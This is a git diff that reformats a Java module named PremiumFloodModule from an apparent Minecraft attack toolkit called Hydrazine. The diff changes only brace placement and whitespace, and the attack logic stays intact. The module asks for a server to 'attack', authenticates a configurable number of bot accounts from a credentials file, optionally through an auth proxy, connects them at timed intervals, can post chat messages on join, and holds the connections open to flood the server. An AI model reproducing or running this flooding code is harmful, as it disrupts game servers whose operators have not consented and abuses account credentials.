@@ -22,237 +22,193 @@ import com.github.steveice10.packetlib.event.session.SessionAdapter;
  * 
  * @author xTACTIXzZ
  * 
- * This module floods a premium server with alt accounts
+ *         This module floods a premium server with alt accounts
  *
  */
-public class PremiumFloodModule implements Module
-{
-	// Create new file where the configuration will be stored (Same folder as jar file)
-	private File configFile = new File(ClassLoader.getSystemClassLoader().getResource(".").getPath() + ".module_" + getName() + ".conf");
-	
+public class PremiumFloodModule implements Module {
+	// Create new file where the configuration will be stored (Same folder as
+	// jar file)
+	private File configFile = new File(
+			ClassLoader.getSystemClassLoader().getResource(".").getPath() + ".module_" + getName() + ".conf");
+
 	// Configuration settings are stored in here
 	private ModuleSettings settings = new ModuleSettings(configFile);
-	
+
 	@Override
-	public String getName() 
-	{
+	public String getName() {
 		return "pflood";
 	}
 
 	@Override
-	public String getDescription() 
-	{
+	public String getDescription() {
 		return "Floods a premium server with bots.";
 	}
 
 	@Override
-	public void start() 
-	{
+	public void start() {
 		// Load settings
 		settings.load();
-				
-		if(!Hydrazine.settings.hasSetting("host") || Hydrazine.settings.getSetting("host") == null)
-		{
+
+		if (!Hydrazine.settings.hasSetting("host") || Hydrazine.settings.getSetting("host") == null) {
 			System.out.println(Hydrazine.errorPrefix + "You have to specify a server to attack (-h)");
-			
+
 			System.exit(1);
 		}
-		
+
 		System.out.println(Hydrazine.infoPrefix + "Starting module \'" + getName() + "\'. Press CTRL + C to exit.");
-		
+
 		Authenticator auth = new Authenticator();
-		Server server = new Server(Hydrazine.settings.getSetting("host"), Integer.parseInt(Hydrazine.settings.getSetting("port")));
-		
+		Server server = new Server(Hydrazine.settings.getSetting("host"),
+				Integer.parseInt(Hydrazine.settings.getSetting("port")));
+
 		int bots = 5;
 		int delay = 1000;
-		
-		if(configFile.exists())
-		{
-			try
-			{
+
+		if (configFile.exists()) {
+			try {
 				bots = Integer.parseInt(settings.getProperty("bots"));
 				delay = Integer.parseInt(settings.getProperty("delay"));
+			} catch (Exception e) {
+				System.out.println(
+						Hydrazine.errorPrefix + "Invalid value in configuration file. Reconfigure the module.");
 			}
-			catch(Exception e)
-			{
-				System.out.println(Hydrazine.errorPrefix + "Invalid value in configuration file. Reconfigure the module.");
-			}
-		}
-		else
-		{
-			if(ModuleSettings.askUserYesNo("This module hasn't been configured yet. Would you like to do so now?"))
-			{
+		} else {
+			if (ModuleSettings.askUserYesNo("This module hasn't been configured yet. Would you like to do so now?")) {
 				configure();
 
 				start();
-			}
-			else
-			{
+			} else {
 				System.out.println(Hydrazine.errorPrefix + "Append the \'-c\' switch to configure the module.");
 			}
-			
+
 			return;
 		}
-		
+
 		// Load credentials from file
-		if(settings.containsKey("credList") && !settings.getProperty("credList").isEmpty())
-		{
+		if (settings.containsKey("credList") && !settings.getProperty("credList").isEmpty()) {
 			FileFactory ff = new FileFactory(new File(settings.getProperty("credList")));
-				
-			for(int i = 0; i < bots; i++)
-			{
+
+			for (int i = 0; i < bots; i++) {
 				Credentials[] credList = ff.getCredentials();
-				
-				if(credList.length == 0)
-				{
+
+				if (credList.length == 0) {
 					System.out.println(Hydrazine.errorPrefix + "No credentials contained in file.");
-					
+
 					return;
 				}
-				
+
 				Random r = new Random();
-				
+
 				Credentials creds = credList[r.nextInt(credList.length)];
-				
+
 				MinecraftProtocol protocol = null;
-				
-				if(Hydrazine.settings.hasSetting("authproxy"))
-				{
+
+				if (Hydrazine.settings.hasSetting("authproxy")) {
 					protocol = auth.authenticate(creds, Authenticator.getAuthProxy());
-				}
-				else
-				{
+				} else {
 					protocol = auth.authenticate(creds);
 				}
-				
-				if(protocol == null)
-				{
+
+				if (protocol == null) {
 					continue;
 				}
-				
+
 				Client client = ConnectionHelper.connect(protocol, server);
-				
+
 				registerListeners(client);
-				
-				try 
-				{
+
+				try {
 					Thread.sleep(delay);
-				} 
-				catch (InterruptedException e) 
-				{
+				} catch (InterruptedException e) {
 					e.printStackTrace();
 				}
 			}
-			
+
 			// Do nothing, clients stay connected until program shuts down
-			while(true)
-			{
-				try 
-				{
+			while (true) {
+				try {
 					Thread.sleep(20);
-				} 
-				catch (InterruptedException e)
-				{
+				} catch (InterruptedException e) {
 					e.printStackTrace();
 				}
 			}
-		}
-		else if(Hydrazine.settings.hasSetting("credentials"))
-		{
-			System.out.println(Hydrazine.errorPrefix + "We need more account credentials in order to flood the server. Reconfigure the module!");
-		}
-		else
-		{
+		} else if (Hydrazine.settings.hasSetting("credentials")) {
+			System.out.println(Hydrazine.errorPrefix
+					+ "We need more account credentials in order to flood the server. Reconfigure the module!");
+		} else {
 			System.out.println(Hydrazine.errorPrefix + "No credentials supplied. Reconfigure the module to do so.");
 		}
 	}
 
 	@Override
-	public void stop(String cause)
-	{
+	public void stop(String cause) {
 		System.out.println(Hydrazine.infoPrefix + "Stopping module " + getName() + ": " + cause);
-		
+
 		System.exit(0);
 	}
 
 	@Override
-	public void configure()
-	{		
+	public void configure() {
 		settings.setProperty("bots", ModuleSettings.askUser("How many bots should be connected to the server?"));
 		settings.setProperty("delay", ModuleSettings.askUser("Delay between connection attempts: "));
-		settings.setProperty("credList", ModuleSettings.askUser("Enter the path to the file containing minecraft account credentials:"));
+		settings.setProperty("credList",
+				ModuleSettings.askUser("Enter the path to the file containing minecraft account credentials:"));
 		settings.setProperty("sendMessageOnJoin", String.valueOf(ModuleSettings.askUserYesNo("Send message on join?")));
-		
-		if(settings.getProperty("sendMessageOnJoin").equals("true"))
-		{
+
+		if (settings.getProperty("sendMessageOnJoin").equals("true")) {
 			settings.setProperty("messageJoin", ModuleSettings.askUser("Message:"));
 			settings.setProperty("messageDelay", ModuleSettings.askUser("Time to wait before sending message:"));
-		}
-		else
-		{
+		} else {
 			settings.setProperty("messageJoin", "");
 		}
-		
+
 		// Create configuration file if not existing
-		if(!configFile.exists())
-		{
+		if (!configFile.exists()) {
 			boolean success = settings.createConfigFile();
-			
-			if(!success)
-			{
+
+			if (!success) {
 				return;
 			}
 		}
-		
+
 		// Store configuration variables
 		settings.store();
 	}
-	
+
 	/*
 	 * Register listeners
 	 */
-	private void registerListeners(Client client)
-	{
-		client.getSession().addListener(new SessionAdapter() 
-		{
+	private void registerListeners(Client client) {
+		client.getSession().addListener(new SessionAdapter() {
 			@Override
-			public void packetReceived(PacketReceivedEvent event) 
-			{
-			    if(event.getPacket() instanceof ServerJoinGamePacket) 
-			    {
-			        if(settings.containsKey("sendMessageOnJoin") && settings.containsKey("messageJoin"))
-			        {
-			        	if(!(settings.getProperty("messageJoin").isEmpty()))
-			            {
-			        		int delay = 1000;
-			        		
-			        		if(configFile.exists())
-			        		{
-			            		try
-			            		{
-			            			delay = Integer.parseInt(settings.getProperty("messageDelay"));
-			            		}
-			            		catch(Exception e)
-			            		{
-			            			System.out.println(Hydrazine.errorPrefix + "Invalid value in configuration file. Reconfigure the module.");
-			            		}
-			        		}
-			        		
-			        		try 
-			        		{
-			        			Thread.sleep(delay);
-							} 
-			        		catch (InterruptedException e) 
-			        		{
-			        			// Client got disconnected or smth else, do not print error
-			        			
-			        			return;
-			        		}
-			        		
-			        		client.getSession().send(new ClientChatPacket(settings.getProperty("messageJoin")));
-			            }
-			        }
-			    }
+			public void packetReceived(PacketReceivedEvent event) {
+				if (event.getPacket() instanceof ServerJoinGamePacket) {
+					if (settings.containsKey("sendMessageOnJoin") && settings.containsKey("messageJoin")) {
+						if (!(settings.getProperty("messageJoin").isEmpty())) {
+							int delay = 1000;
+
+							if (configFile.exists()) {
+								try {
+									delay = Integer.parseInt(settings.getProperty("messageDelay"));
+								} catch (Exception e) {
+									System.out.println(Hydrazine.errorPrefix
+											+ "Invalid value in configuration file. Reconfigure the module.");
+								}
+							}
+
+							try {
+								Thread.sleep(delay);
+							} catch (InterruptedException e) {
+								// Client got disconnected or smth else, do not
+								// print error
+
+								return;
+							}
+
+							client.getSession().send(new ClientChatPacket(settings.getProperty("messageJoin")));
+						}
+					}
+				}
 			}
 		});
 	}
